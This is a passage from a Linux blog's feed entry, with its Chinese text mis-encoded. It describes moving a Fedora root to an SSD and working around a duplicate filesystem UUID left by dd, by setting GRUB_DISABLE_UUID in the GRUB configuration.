class="string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span> PARTUUID=<span class="string">&quot;fe64f395-7520-42c3-939b-b17eb7064cec&quot;</span></span><br><span class="line">/dev/mapper/fedora-root: UUID=<span class="string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span></span><br></pre></td></tr></table></figure><p>ç”±äºdd çš„åŸå› ï¼Œ&#x2F;dev&#x2F;sdb1 å’Œ &#x2F;dev&#x2F;mapper&#x2F;fedora-root çš„ UUID å±…ç„¶æ˜¯ç›¸åŒçš„ã€‚ç¬¬ä¸€ä¸ª<br>æƒ³æ³•æ˜¯æŠŠ&#x2F;dev&#x2F;sdb1 çš„ UUID ç»™æ”¹äº†ã€‚æ”¾ç‹—æœå‘ç°æœ‰ä¸‹é¢çš„æ–¹æ³•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ uuidgen </span><br><span class="line">8e4c27b2-c63e-4d1d-8ac4-5ddd90669eb0</span><br><span class="line"></span><br><span class="line">tune2fs /dev/&#123;device&#125; -U &#123;uuid&#125;</span><br></pre></td></tr></table></figure><p>å¯æ˜¯tune2fs æ—¶æŠ¥é”™ï¼Œæ­»æ´»æ”¹ä¸è¿‡æ¥ã€‚lzx æç¤ºå¯ä»¥çœ‹çœ‹å¦‚ä½•æ˜¯grub.cfg ä¸ä½¿ç”¨uuidï¼Œ<br>å‘ç°æœ‰ä¸ªå‚æ•° GRUB_DISABLE_UUID&#x3D;trueï¼Œ åœ¨ &#x2F;etc&#x2F;default&#x2F;grub åŠ ä¸Šè¿™è¡Œï¼Œé‡æ–°ç”Ÿæˆ<br>grub.cfg é‡å¯ï¼Œä¸€åˆ‡ OK è¿›å…¥åˆ°SSD çš„æ–°root</p><p>æœ‰çš„ç³»ç»Ÿä¸Šçš„å‚æ•°å¯èƒ½ä¸å¤ªä¸€æ ·ï¼Œubuntu ç³»ç»Ÿé‡Œè¿™ä¸ªå‚æ•°å¥½åƒçš„æ˜¯ GRUB_DISABLE_LINUX_UUID&#x3D;true<br>å¯èƒ½éœ€è¦ç¡®è®¤ä¸€ä¸‹ã€‚</p><ul><li>EOF</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç”±äºæŸäº›éœ€æ±‚ï¼Œå†³å®šä¸ŠSSDï¼Œæé«˜ä¸€ä¸‹ç¡¬ç›˜è¯»å†™é€Ÿåº¦ã€‚ä¸ŠäºŒæ‰‹ä¸œä¹°äº†ä¸‰æ˜Ÿ(SAMSUNG) 860 EVO&lt;br&gt;æœ€åˆçš„æƒ³æ³•æ˜¯ä½œä¸ºæ•°æ®ç›˜ä½¿ç”¨ï¼Œå³æ“ä½œç³»ç»Ÿè¿˜æ˜¯è·‘åœ¨æœºæ¢°ç¡¬ç›˜ä¸Šï¼Œä»”ç»†ä¸€æ€è€ƒï¼Œè¿˜æ˜¯æŠ˜è…¾&lt;br&gt;ä¸€ä¸‹ï¼Œè¦ä¸å®åœ¨æ˜¯æœ‰äº›æµªè´¹ï¼Œäº‹å®è¯æ˜ï¼ŒæŠ˜è…¾æ˜¯å€¼å¾—çš„ï¼Œæ„Ÿè§‰å°±æƒ³é£ä¸€æ ·ã€‚&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
</feed>
